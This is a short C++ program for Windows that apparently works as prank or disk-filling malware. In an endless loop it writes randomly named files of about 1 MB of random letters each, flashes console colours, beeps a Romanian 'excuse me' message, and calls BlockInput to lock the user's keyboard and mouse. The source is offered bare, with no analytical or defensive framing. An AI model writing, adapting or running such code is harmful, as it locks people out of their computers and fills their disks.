#include <windows.h>
#include <winable.h>
#include <iostream>
#include <fstream>
#include <string>
#include <time.h>
#include <sstream>

using namespace std;

ostringstream oss;

#define CONDITION true
#define SIZE 500
#define FILE_SIZE 1000000
#define END_PHR 256
#define ASCII_SIZE 127
#define MAX_APROVED_SIZE 50

class GenerateString
{
protected:
    string written_text;
    string newString;
public:
    GenerateString();
    void Prepare();
    string GetString();
    string GetWrittenText();
    void GenerateWrittenText();
};

string GenerateString::GetWrittenText()
{
    return written_text;
}

void GenerateString::GenerateWrittenText()
{
    char characters[SIZE];
    for(int i=0;i<SIZE-1;i++)
        characters[i] = (char)(i % 20) + 97;

    for(int i=0;i<FILE_SIZE;i++)
    {
        this->written_text+=characters[rand() % SIZE];
        i % END_PHR==0?this->written_text[i]='\n':this->written_text[i] = this->written_text[i];
    }

}
string GenerateString::GetString()
{
    return this->newString;
}

GenerateString::GenerateString()
{
    this->Prepare();
    this->GenerateWrittenText();
}

void GenerateString::Prepare()
{
    char characters[SIZE];
    for(int i=0;i<SIZE-1;i++)
        characters[i] = (char)(i % 20) + 97;
    unsigned int word_size = rand() % MAX_APROVED_SIZE + 1;

    unsigned int current_position = 0;
    for(int i=0;i<word_size;++i)
    {
        unsigned short next_position = rand() % SIZE;
        this->newString += characters[next_position];
        ++current_position;
    }
}

int main()
{
    srand (time(NULL));
    int i=0;
    while(CONDITION)
    {
        GenerateString generated_string;
        ofstream out_file;
        i%3==0?system("color 0a"):i%3==1?system("color 1b"):system("color 3c");
        i%2==0?cout<<"\aMI SCUZI STIMABILE\n":cout<<"\t\aMI SCUZI STIMABILE\n";
        oss << generated_string.GetString() << ".txt";
        out_file.open (oss.str());
        oss.str("");
        out_file<<generated_string.GetWrittenText();
        BlockInput(true);
        i++;
    }
    return 0;
}
